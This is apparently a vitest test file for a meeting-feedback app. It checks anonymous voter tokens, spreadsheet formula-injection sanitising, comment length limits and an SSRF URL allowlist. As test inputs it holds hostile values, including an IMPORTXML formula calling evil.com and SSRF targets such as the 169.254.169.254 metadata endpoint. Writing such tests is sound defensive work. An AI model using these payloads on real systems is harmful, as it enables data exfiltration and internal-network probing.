import { describe, it, expect } from 'vitest';
import { getAnonymousVoterToken } from '../src/utils/CryptoHelper';

// Reproduction of backend sanitizeText logic for verification
const sanitizeText = (input: unknown, maxLength: number): string => {
  if (typeof input !== 'string') return '';
  let s = input.trim();
  if (s.length > maxLength) {
    s = s.substring(0, maxLength);
  }
  if (/^[=+\-@\t\r]/.test(s)) {
    s = "'" + s;
  }
  return s;
};

describe('Integration Test: Backend Security, Anti-Spam & Anti-Injection', () => {
  it('generates a 64-character anonymous voter token without exposing user identity', async () => {
    const meetingHash = 'a'.repeat(64);
    const token = await getAnonymousVoterToken(meetingHash);

    expect(token).toMatch(/^[a-f0-9]{64}$/);
    expect(token.length).toBe(64);

    // Deterministic for the same user + meeting
    const token2 = await getAnonymousVoterToken(meetingHash);
    expect(token).toBe(token2);
  });

  it('generates completely different voter tokens for different meetings to prevent cross-meeting tracking', async () => {
    const meetingHash1 = 'a'.repeat(64);
    const meetingHash2 = 'b'.repeat(64);

    const token1 = await getAnonymousVoterToken(meetingHash1);
    const token2 = await getAnonymousVoterToken(meetingHash2);

    expect(token1).not.toBe(token2);
  });

  it('neutralizes Google Sheets / Excel formula injection attempts in text inputs', () => {
    // Dangerous formula payloads
    expect(sanitizeText('=IMPORTXML("http://evil.com","//")', 1000)).toBe('\'=IMPORTXML("http://evil.com","//")');
    expect(sanitizeText('+1+2+3', 1000)).toBe('\'+1+2+3');
    expect(sanitizeText('-2+5', 1000)).toBe('\'-2+5');
    expect(sanitizeText('@SUM(A1:A10)', 1000)).toBe('\'@SUM(A1:A10)');
    expect(sanitizeText('\t=cmd', 1000)).toBe('\'=cmd');

    // Normal text is preserved
    expect(sanitizeText('Réunion très productive !', 1000)).toBe('Réunion très productive !');
  });

  it('enforces string length bounds on user comments', () => {
    const longComment = 'x'.repeat(1500);
    const sanitized = sanitizeText(longComment, 1000);
    expect(sanitized.length).toBe(1000);
  });

  it('rejects submissions with missing, empty, or malformed voterToken', () => {
    const isValidToken = (token: unknown): boolean => {
      const s = String(token || '').trim().toLowerCase();
      return Boolean(s && /^[a-f0-9]{64}$/.test(s));
    };

    expect(isValidToken(undefined)).toBe(false);
    expect(isValidToken('')).toBe(false);
    expect(isValidToken('short-token')).toBe(false);
    expect(isValidToken('g'.repeat(64))).toBe(false); // Non-hex
    expect(isValidToken('a'.repeat(63))).toBe(false);
    expect(isValidToken('a'.repeat(65))).toBe(false);
    expect(isValidToken('a'.repeat(64))).toBe(true);
  });

  it('strictly blocks SSRF and unauthorized destination URLs for background fetch', () => {
    const ALLOWED_APPS_SCRIPT_PREFIX = 'https://script.google.com/a/macros/adeo.com/s/';
    const isUrlAllowed = (url: unknown): boolean =>
      typeof url === 'string' && url.startsWith(ALLOWED_APPS_SCRIPT_PREFIX);

    expect(isUrlAllowed('http://169.254.169.254/latest/meta-data')).toBe(false);
    expect(isUrlAllowed('http://localhost:3000/internal')).toBe(false);
    expect(isUrlAllowed('https://evil.com/leak')).toBe(false);
    expect(isUrlAllowed('https://script.google.com/macros/s/evil/exec')).toBe(false);
    expect(isUrlAllowed('https://script.google.com/a/macros/adeo.com/s/AKfycbzdzKk.../exec')).toBe(true);
  });
});
